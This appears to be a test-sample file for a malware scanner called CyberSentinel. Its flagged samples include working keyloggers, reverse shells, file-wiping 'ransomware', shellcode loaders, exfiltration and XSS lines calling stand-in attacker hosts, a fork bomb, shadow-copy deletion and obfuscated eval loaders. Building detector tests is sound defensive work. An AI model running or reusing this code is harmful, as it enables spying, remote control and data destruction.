@@ -1,0 +1,839 @@
+Category: HIGH RISK (Malware Logic)
+1. C++ Keylogger (Spyware) Tests: Windows API Hooks, Keystroke Logging
+
+#include <windows.h>
+#include <iostream>
+#include <fstream>
+
+using namespace std;
+
+int main() {
+    char key;
+    while (true) {
+        for (key = 8; key <= 255; key++) {
+            if (GetAsyncKeyState(key) == -32767) {
+                ofstream logfile;
+                logfile.open("stolen_keys.txt", ios::app);
+                logfile << key;
+                logfile.close();
+            }
+        }
+    }
+    return 0;
+}
+2. C Reverse Shell (Backdoor) Tests: Socket programming, Process execution
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <winsock2.h>
+
+// Connecting back to attacker to give control
+int main() {
+    WSADATA wsaData;
+    WSAStartup(MAKEWORD(2,2), &wsaData);
+    
+    struct sockaddr_in sa;
+    SOCKET s = socket(AF_INET, SOCK_STREAM, 0);
+    
+    sa.sin_family = AF_INET;
+    sa.sin_port = htons(4444); 
+    sa.sin_addr.s_addr = inet_addr("192.168.1.50"); // Evil IP
+
+    connect(s, (struct sockaddr *)&sa, sizeof(sa));
+
+    // Redirecting input/output to the socket
+    STARTUPINFO si;
+    memset(&si, 0, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES;
+    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;
+
+    PROCESS_INFORMATION pi;
+    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+    return 0;
+}
+
+3. Java File Deleter (Ransomware Logic) Tests: File IO, recursive deletion
+
+import java.io.File;
+
+public class RansomLogic {
+    public static void main(String[] args) {
+        File folder = new File("C:\\Users\\User\\Documents");
+        deleteFiles(folder);
+    }
+
+    public static void deleteFiles(File folder) {
+        for (File file : folder.listFiles()) {
+            if (file.isDirectory()) {
+                deleteFiles(file);
+            } else {
+                // Malicious action: destroying user data
+                System.out.println("Deleting: " + file.getName());
+                file.delete(); 
+            }
+        }
+    }
+}
+4. MATLAB Data Exfiltration Tests: Web access, file reading
+
+Matlab
+
+% Stealing sensitive data and sending to web
+data = fileread('C:\Passwords.txt');
+url = 'http://attacker-site.com/steal';
+response = webwrite(url, 'data', data);
+disp('Data stolen successfully');
+Category: SUSPICIOUS (Hacking Tools / Risky behaviors)
+
+5. C Memory Injection (Shellcode Runner) Tests: VirtualAlloc, CreateThread (common in loaders)
+
+
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    // Shellcode payload (example placeholder)
+    unsigned char payload[] = "\x90\x90\xcc\xc3"; 
+
+    // Allocating executable memory (Suspicious!)
+    void *exec_mem = VirtualAlloc(0, sizeof(payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    
+    RtlMoveMemory(exec_mem, payload, sizeof(payload));
+    
+    // Executing the payload in a new thread
+    HANDLE th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
+    WaitForSingleObject(th, -1);
+    
+    return 0;
+}
+
+6. Java Network Port Scanner Tests: Socket connections in loops
+
+Java
+
+import java.net.Socket;
+
+public class PortScanner {
+    public static void main(String[] args) {
+        String ip = "192.168.1.1";
+        for (int port = 1; port <= 1024; port++) {
+            try {
+                Socket s = new Socket(ip, port);
+                System.out.println("Port Open: " + port);
+                s.close();
+            } catch (Exception e) {
+                // Port closed
+            }
+        }
+    }
+}
+7. Bash Fork Bomb (Denial of Service) Tests: Process spawning loop
+
+# This function calls itself recursively forever to crash the system
+:(){ :|:& };:
+Category: CLEAN / BENIGN (False Positive Test)
+
+8. C++ "Hello World" (Safe) Tests: Standard IO, Clean logic
+
+C++
+
+#include <iostream>
+
+using namespace std;
+
+int main() {
+    cout << "Welcome to CyberSentinel!" << endl;
+    cout << "This is a safe application." << endl;
+    
+    int a = 5, b = 10;
+    cout << "Sum: " << (a + b) << endl;
+    
+    return 0;
+}
+
+9. Java Student Database (Safe) Tests: Classes, file writing (safe context)
+
+Java
+
+import java.io.FileWriter;
+import java.io.IOException;
+
+public class StudentRecord {
+    public static void main(String[] args) {
+        try {
+            FileWriter writer = new FileWriter("students.txt");
+            writer.write("ID: 101, Name: John Doe\n");
+            writer.write("ID: 102, Name: Jane Smith\n");
+            writer.close();
+            System.out.println("Database updated successfully.");
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+}
+10. MATLAB Matrix Multiplication (Safe) Tests: Math operations
+
+Matlab
+
+% Standard scientific calculation
+A = [1, 2, 3; 4, 5, 6; 7, 8, 9];
+B = eye(3);
+C = A * B;
+
+disp('Result Matrix:');
+disp(C);
+plot(C);
+title('Safe Matrix Plot');
+11. Go Web Server (Safe) Tests: Networking (Server-side, not malicious)
+
+Go
+
+package main
+
+import (
+    "fmt"
+    "net/http"
+)
+
+func handler(w http.ResponseWriter, r *http.Request) {
+    fmt.Fprintf(w, "Welcome to the safe server!")
+}
+
+func main() {
+    http.HandleFunc("/", handler)
+    http.ListenAndServe(":8080", nil)
+}
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+category: HIGH RISK (Malware Simulation)
+1. Ransomware Logic (File Encryption) Tests: File Tampering, OS usage
+
+Python
+
+import os
+from cryptography.fernet import Fernet
+
+def encrypt_files():
+    key = Fernet.generate_key()
+    for root, dirs, files in os.walk("C:\\Users\\Target\\Documents"):
+        for file in files:
+            file_path = os.path.join(root, file)
+            with open(file_path, "wb") as f:
+                f.write(b"ENCRYPTED_BY_BAD_ACTOR")
+    
+    print("All your files are encrypted!")
+
+2. Reverse Shell (Backdoor) Tests: Network Exfiltration, Command Execution
+
+Python
+
+import socket
+import subprocess
+import os
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("192.168.1.100", 4444))
+os.dup2(s.fileno(), 0)
+os.dup2(s.fileno(), 1)
+os.dup2(s.fileno(), 2)
+p = subprocess.call(["/bin/sh", "-i"])
+
+3. Keylogger (Spyware) Tests: Keylogging, Library usage
+
+Python
+
+from pynput.keyboard import Listener
+
+def on_press(key):
+    with open("log.txt", "a") as f:
+        f.write(str(key))
+
+# Hooks into system keyboard events
+with Listener(on_press=on_press) as listener:
+    listener.join()
+
+4. Windows Persistence (Registry Attack) Tests: Persistence, Registry Modification
+
+Python
+
+import os
+
+# Tries to add itself to Windows Startup to run every time computer turns on
+cmd = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v EvilApp /t REG_SZ /d C:\\evil.exe"
+os.system(cmd)
+Category: SUSPICIOUS (Obfuscation & Hacking Tools)
+
+5. Obfuscated Payload (Hiding Code) Tests: Obfuscation, Base64 decoding
+
+Python
+
+import base64
+
+# "os.system('cmd.exe')" encoded in Base64
+payload = "b3Muc3lzdGVtKCdjbWQuZXhlJyk="
+decoded = base64.b64decode(payload)
+eval(decoded)
+
+6. Network Scanner (Reconnaissance) Tests: Network usage
+
+Python
+
+import socket
+
+target = "192.168.1.1"
+for port in range(1, 1024):
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    result = s.connect_ex((target, port))
+    if result == 0:
+        print(f"Port {port} is open")
+    s.close()
+
+7. Data Exfiltration (Stealing Info) Tests: Network Exfiltration, HTTP Requests
+
+Python
+
+import requests
+import json
+
+passwords = {"gmail": "12345", "bank": "secret"}
+# Sending stolen data to attacker's server
+requests.post("http://attacker-site.com/steal", data=json.dumps(passwords))
+Category: WEB ATTACKS (JavaScript/HTML)
+
+8. XSS Payload (Cross-Site Scripting) Tests: Web Vulnerability patterns
+
+JavaScript
+
+var search = "<script>document.location='http://evil.com/cookie?c='+document.cookie</script>";
+document.write("Results for: " + search);
+
+9. SQL Injection (Database Attack) Tests: Database manipulation patterns
+
+SQL
+
+SELECT * FROM users WHERE username = 'admin' AND password = '' OR '1'='1';
+-- The OR '1'='1' bypasses the password check
+DROP TABLE users;
+
+
+Category: CLEAN / BENIGN (False Positive Test)
+
+10. Calculator App (Safe Python) Tests: Clean Code (Should get 0-10 Risk Score)
+
+Python
+
+def add(x, y):
+    return x + y
+
+def subtract(x, y):
+    return x - y
+
+print("Simple Calculator")
+num1 = float(input("Enter first number: "))
+num2 = float(input("Enter second number: "))
+print("Result:", add(num1, num2))
+
+
+11. System Maintenance Script (Safe Admin Tool) Tests: Context (Uses 'os' but for good reason)
+
+Python
+
+import os
+import shutil
+
+# Cleaning up temporary files
+temp_folder = "C:\\Temp"
+if os.path.exists(temp_folder):
+    print("Cleaning temp folder...")
+    for filename in os.listdir(temp_folder):
+        file_path = os.path.join(temp_folder, filename)
+        try:
+            if os.path.isfile(file_path):
+                os.unlink(file_path)
+        except Exception as e:
+            print(f"Error deleting {file_path}")
+
+
+---------------------------------------------------------------------------------------------------------------------------------------
+
+Binary File Check 
+Sample 1: The "Clean" File (Real Windows App)
+Goal: Test if the PE Parser works on legitimate files.
+
+Open your file explorer and go to C:\Windows\System32\.
+
+Find whoami.exe or notepad.exe.
+
+Copy it to your Desktop (don't move it, just copy).
+
+Upload this file to your CyberSentinel dashboard.
+
+Expected Result: Malware Type: Clean File or Benign.
+
+Why: It has a valid PE header, but contains no malicious code patterns like "keylogger" or "reverse shell".
+
+Sample 2: The "Fake" Malware (High Risk)
+Goal: Test if your Rule Engine and YARA detects malicious strings.
+
+We will create a harmless text file that pretends to be a virus by containing specific trigger words.
+
+Open Notepad.
+
+Paste the following text exactly:
+
+Plaintext
+
+MZ_HEADER_SIMULATION
+This is a dummy test file for CyberSentinel.
+
+// Simulating suspicious behavior rules:
+function malicious_start() {
+    os.system("cmd.exe /c format c:");
+    subprocess.call("powershell -ExecutionPolicy Bypass");
+    requests.post("http://evil-server.com/steal_passwords");
+
+    // Simulating YARA rules:
+    keylogger.start();
+    socket.connect("192.168.1.5", 4444);
+    base64.b64decode("aGlkZGVuX3BheWxvYWQ=");
+}
+Save the file as fake_virus.exe.
+
+Important: In the "Save as type" dropdown, choose "All Files (.)" so it saves as .exe, not .txt.
+
+Upload this file.
+
+Expected Result: Malware Type: High-Risk Malware.
+
+Why: Your binary_analyzer.py extracts the text, and static_analyzer.py finds "cmd.exe", "powershell", and "requests.post".
+
+Sample 3: The "Obfuscated" File (Suspicious)
+Goal: Test if the system detects hidden/encoded data.
+
+Open Notepad.
+
+Paste this text:
+
+Plaintext
+
+MZ
+var payload = "Y21kLmV4ZSAvYyBwb3dlcnNoZWxs"; // Base64 encoded "cmd.exe"
+eval(base64.b64decode(payload));
+
+section.UPX0
+section.UPX1
+Save the file as packed_sample.dll.
+
+Upload this file.
+
+Expected Result: Malware Type: Suspicious or High-Risk.
+
+Why: It detects UPX (packing/obfuscation) and base64 decoding attempts.
+
+-------------------------------------------------------------------------------------------------------------------
+other example binary file
+
+Open Notepad.
+
+Paste this "Suspicious" content (these are strings your rules look for):
+
+Plaintext
+
+This is a test file for CyberSentinel.
+MZ header simulation...
+
+suspicious_function() {
+   os.system("cmd.exe /c del system32");
+   requests.post("http://evil-server.com/steal_data");
+   subprocess.call("powershell -ExecutionPolicy Bypass");
+   keylogger.start();
+}
+Save the file as fake_malware.exe.
+
+Note: In the "Save as type" dropdown, select "All Files" so it doesn't add .txt at the end.
+
+Drag & Drop fake_malware.exe into the dashboard.
+
+Click Analyze.
+
+✅ Expected Result:
+
+Malware Type: "High-Risk Malware" (Red Badge).
+
+Risk Score: Should be 80+.
+
+Behaviors: You should see alerts like:
+
+Suspicious: cmd.exe detected
+
+Network: http:// detected
+
+YARA: High_Risk_Command_Exec (High)
+
+Explanation: The AI should explain that this file contains commands attempting to delete files and connect to external servers
+-----------------------------------------------------------------------------------------------------------------------------------------------------
+1. Python: Base64 + Eval (Classic Hiding)
+What it does: Encodes a dangerous command ("print('Malware executed')") into Base64 so it looks like random gibberish, then decodes and runs it.
+
+Python
+
+import base64
+
+# Malicious payload hidden as text
+secret_code = "cHJpbnQoJ01hbHdhcmUgZXhlY3V0ZWQnKQ==" 
+
+# Decoder
+decoded_data = base64.b64decode(secret_code)
+
+# Execute the hidden string as code
+eval(decoded_data)
+Triggers: base64.b64decode, eval(
+
+2. JavaScript: Hex Encoding & Char Codes
+What it does: Builds a command string character by character using numeric codes to avoid writing suspicious words like "alert" or "document".
+
+JavaScript
+
+// Hiding "alert('Hacked')" using ASCII codes
+var payload = String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 72, 97, 99, 107, 101, 100, 39, 41);
+
+// Hiding URL characters
+var hidden_url = unescape("%68%74%74%70%3A%2F%2F%65%76%69%6C%2E%63%6F%6D");
+
+// Execute
+eval(payload);
+Triggers: String.fromCharCode, unescape, eval(
+
+3. PowerShell: Encoded Command
+What it does: PowerShell attackers often use -EncodedCommand to pass a Base64 string directly to the shell, bypassing antivirus scanners that look for plain text keywords.
+
+PowerShell
+
+# Hiding "Start-Process cmd.exe"
+$command = "UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgAGMAbQBkAC4AZQB4AGUA"
+
+# Decode and run
+$bytes = [System.Convert]::FromBase64String($command)
+$decoded = [System.Text.Encoding]::Unicode.GetString($bytes)
+Invoke-Expression $decoded
+Triggers: FromBase64String, Invoke-Expression
+
+4. PHP: Compression & Rotation (ROT13)
+What it does: Uses str_rot13 (shifting letters 13 places) and gzinflate (compression) to make the code unreadable to humans.
+
+PHP
+
+<?php
+// "eval(base64_decode('...'))" encoded via ROT13
+$obfuscated = str_rot13("riny(onfr64_qrpbqr('...'));");
+
+// Decompressing a hidden payload
+$payload = gzinflate(base64_decode("HJ3H..."));
+
+eval($obfuscated);
+?>
+Triggers: str_rot13, gzinflate, base64_decode
+
+5. Hex String (Universal)
+What it does: Uses hexadecimal representation (\xHH) to hide text. Your analyzer's de-obfuscation logic should also catch this.
+
+Python
+
+# This actually says "os.system('cmd.exe')"
+exec("\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x63\x6d\x64\x2e\x65\x78\x65\x27\x29")
+Triggers: exec(, Hex pattern detection
+
+-------------------------------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------
+Base64 Obfuscation Sample
+import base64
+
+# This long string is actually hidden code
+encoded_payload = "cHJpbnQoJ1xuTUFMSUNJT1VTIFBBWUxPw4ZEIERFVEVDVEVEIScpCnByaW50KCdUaGlzIHdhcyBoaWRkZW4gaW5zaWRlIEJhc2U2NCBjb2RlLicp"
+
+# The attacker decodes it at runtime to hide from antivirus
+decoded_bytes = base64.b64decode(encoded_payload)
+decoded_script = decoded_bytes.decode('utf-8')
+
+# Execute the hidden code
+exec(decoded_script)
+
+
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Here are 6 Advanced Obfuscation Samples specifically designed to trigger the "Obfuscation" rules in your new behavior_rules.py.
+
+These cover techniques like Memory Injection, Serialization, Bitwise Packing, and Dynamic Evaluation. Paste these into your Source Code tab to test detection.
+
+1. C++ Memory Injection (Shellcode Loader)
+Target Rule: VirtualAlloc, WriteProcessMemory What it does: Allocates raw memory and writes malicious code directly into it (common in droppers and loaders).
+
+C++
+
+#include <windows.h>
+
+int main() {
+    // Malicious shellcode (placeholder)
+    unsigned char shellcode[] = "\x90\x90\xCC\xC3";
+
+    // Allocating memory with Execute permissions (Suspicious!)
+    void* exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    
+    // Writing payload to memory
+    WriteProcessMemory(GetCurrentProcess(), exec_mem, shellcode, sizeof(shellcode), NULL);
+    
+    // Execute
+    ((void(*)())exec_mem)();
+    return 0;
+}
+2. Python Code Serialization (Marshal)
+Target Rule: marshal, exec What it does: Uses Python's internal object serialization format (marshal) to turn code into unreadable binary data, then loads and runs it.
+
+Python
+
+import marshal
+
+# "print('Malware Loaded')" compiled and serialized
+serialized_payload = b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00@\x00\x00\x00s\x16\x00\x00\x00e\x00\x00d\x01\x00\x83\x01\x00\x01d\x00\x00S(\x02\x00\x00\x00Nt\x0e\x00\x00\x00Malware Loaded(\x01\x00\x00\x00t\x05\x00\x00\x00print(\x00\x00\x00\x00(\x00\x00\x00\x00s\x04\x00\x00\x00test'
+
+# Deserializing and executing
+code_obj = marshal.loads(serialized_payload)
+exec(code_obj)
+3. PHP Binary Packing & Compression
+Target Rule: pack, gzinflate, eval What it does: Converts a string into a binary structure (pack), compresses it (gzinflate), and then executes the result.
+
+PHP
+
+<?php
+// Malicious payload hidden in packed format
+$payload = "7333..."; 
+
+// Unpacking binary data
+$packed = pack('H*', $payload);
+
+// Decompressing
+$code = gzinflate($packed);
+
+// Execution
+eval($code);
+?>
+4. C# Base64 & Reflection
+Target Rule: Convert.FromBase64String, Assembly.Load (covered by general rules) What it does: Loads a compiled DLL (malware) from a Base64 string directly into memory without saving it to disk (Fileless Malware).
+
+C#
+
+using System;
+using System.Reflection;
+
+class MaliciousLoader {
+    static void Main() {
+        string b64Dll = "TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAA..."; // Hidden DLL
+
+        // Decode Base64
+        byte[] rawAssembly = Convert.FromBase64String(b64Dll);
+
+        // Load into memory (Reflective Loading)
+        Assembly.Load(rawAssembly);
+    }
+}
+5. Python XOR Encryption (Custom Function)
+Target Rule: xor_encrypt (Matches the function name in your specific rules list) What it does: Uses a simple XOR cipher to scramble text. This is a very common technique because it is easy to implement and breaks signature detection.
+
+Python
+
+def xor_encrypt(data, key):
+    return ''.join(chr(ord(c) ^ key) for c in data)
+
+# "import os; os.system('cmd')" encrypted with key 5
+encrypted_code = "lhu{{\"j~?%j~+v|vyph.'fhi'" 
+
+# Decrypting at runtime
+decrypted = xor_encrypt(encrypted_code, 5)
+
+# Execute
+exec(decrypted)
+6. JavaScript Dynamic Definition (Reflect)
+Target Rule: Reflect.define, eval What it does: Uses modern JavaScript Reflect API to modify objects or define malicious properties at runtime to hide intent.
+
+JavaScript
+
+// Hiding a malicious function inside a normal object
+const safeObject = {};
+
+// Dynamically injecting a function named "run" that executes code
+Reflect.defineProperty(safeObject, 'run', {
+  value: function(code) {
+    // Obfuscated execution
+    const f = new Function(code); 
+    f();
+  }
+});
+
+// Execute payload
+safeObject.run("alert('XSS Attack Successful')");
+
+------------------------------------------------------------------------------------------------------------------------------------------
+Level 1: Score 0 (Safe Code)
+Why: No risky functions. Just simple logic.
+
+Python
+
+# Level 1: Pure Logic (Score: 0)
+def calculate_area(radius):
+    pi = 3.14159
+    area = pi * (radius ** 2)
+    return area
+
+print(f"Area is: {calculate_area(5)}")
+Level 2: Score ~20-30 (Low Risk - Network Activity)
+Why: It connects to the internet (Network_Activity = 20), but doesn't steal anything. Math: Max(20) = 20.
+
+Python
+
+# Level 2: Simple Web Request (Score: ~20)
+import requests
+
+def check_google():
+    # Triggers: "Network_Activity" (Score 20)
+    response = requests.get("https://www.google.com")
+    print("Status Code:", response.status_code)
+
+check_google()
+Level 3: Score ~55-60 (Medium Risk - Obfuscation)
+Why: It uses Base64 (Obfuscation = 55) and writes a file (File Tampering = 30). Math: Max(55) + (10% of 30) = 55 + 3 = 58.
+
+Python
+
+# Level 3: Obfuscated File Write (Score: ~58)
+import base64
+
+# Triggers: "Obfuscation" (Score 55)
+secret = "SGVsbG8gV29ybGQ="
+decoded = base64.b64decode(secret)
+
+# Triggers: "File Tampering" (Score 30)
+with open("log.txt", "wb") as f:
+    f.write(decoded)
+Level 4: Score ~80-88 (High Risk - Persistence + Commands)
+Why: It tries to stay on the system (Persistence = 75) and runs a command (Suspicious_Command_Exec = 50). Math: Max(75) + (10% of 50) = 75 + 5 = 80.
+
+Python
+
+# Level 4: Persistence Attempt (Score: ~80)
+import os
+import shutil
+
+# Triggers: "Persistence" (Score 75) - Adding to Startup folder
+startup_path = os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
+shutil.copy("my_script.exe", startup_path)
+
+# Triggers: "Suspicious_Command_Exec" (Score 50)
+os.system("echo Persistence established")
+Level 5: Score 100 (Critical - Ransomware)
+Why: It encrypts files (Ransomware_Behavior = 100) and deletes backups (Shadow Copy Deletion = 100). Math: Max(100) + (10% of others) = 100 (Capped).
+
+Python
+
+# Level 5: Ransomware Simulator (Score: 100)
+import os
+from cryptography.fernet import Fernet
+
+# Triggers: "Ransomware_Behavior" (Score 100)
+def encrypt_files():
+    key = Fernet.generate_key()
+    for file in os.listdir("."):
+        if file.endswith(".txt"):
+            print(f"Encrypting {file}...")
+
+# Triggers: "Shadow Copy Deletion" (Score 100)
+# Triggers: "High_Risk_Command_Exec" (Score 90)
+os.system("vssadmin.exe Delete Shadows /All /Quiet")
+
+encrypt_files()
+----------------------------------------------------------------------------------------------------------
+1. Basic Network Request (Score: 20)
+Triggers: Network_Activity (20)
+
+Math: Max(20) = 20
+
+Why: It connects to the internet but doesn't steal data or execute commands.
+
+Python
+
+import requests
+
+def ping_server():
+    # Only triggers "Network_Activity" (Low Risk)
+    try:
+        response = requests.get("https://www.google.com")
+        print("Server is online!")
+    except:
+        print("Server is offline.")
+
+ping_server()
+2. File Logger (Score: 30)
+Triggers: File Tampering (30)
+
+Math: Max(30) = 30
+
+Why: It opens and writes to a file. This is standard behavior for logs but can be suspicious, so it gets a low warning.
+
+Python
+
+def write_log(message):
+    # Only triggers "File Tampering" (Low Risk)
+    with open("app_log.txt", "w") as f:
+        f.write(f"[LOG]: {message}\n")
+
+write_log("Application started successfully.")
+3. File Downloader (Score: ~32)
+Triggers: File Tampering (30) + Network_Activity (20)
+
+Math: Max(30) + (10% of 20) = 30 + 2 = 32
+
+Why: A common pattern for updates (download + save). It is not malicious unless it executes the file.
+
+Python
+
+import requests
+
+def update_app():
+    # Triggers "Network_Activity" (20)
+    data = requests.get("https://mysite.com/update.zip").content
+    
+    # Triggers "File Tampering" (30)
+    with open("update.zip", "wb") as f:
+        f.write(data)
+
+update_app()
+4. SQL Injection Test (Score: 40)
+Triggers: Database Injection (40)
+
+Math: Max(40) = 40
+
+Why: This string looks like a hack attempt, but it's just text. The analyzer flags it as a "Potential Risk."
+
+Python
+
+# This looks like an SQL Injection attack string
+query_payload = "SELECT * FROM users WHERE id = 1 UNION SELECT username, password FROM admin --"
+
+print(f"Testing payload: {query_payload}")
+5. Crypto Mining Config (Score: 45)
+Triggers: Crypto Mining (45)
+
+Math: Max(45) = 45
+
+Why: Matches keywords associated with mining pools (stratum+tcp, nicehash), often found in unwanted software (Grayware).
+
+JSON
+
+// mining_config.json
+{
+    "pool_address": "stratum+tcp://nicehash.com:3333",
+    "wallet": "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
+    "algorithm": "cryptonight",
+    "threads": 4
+}
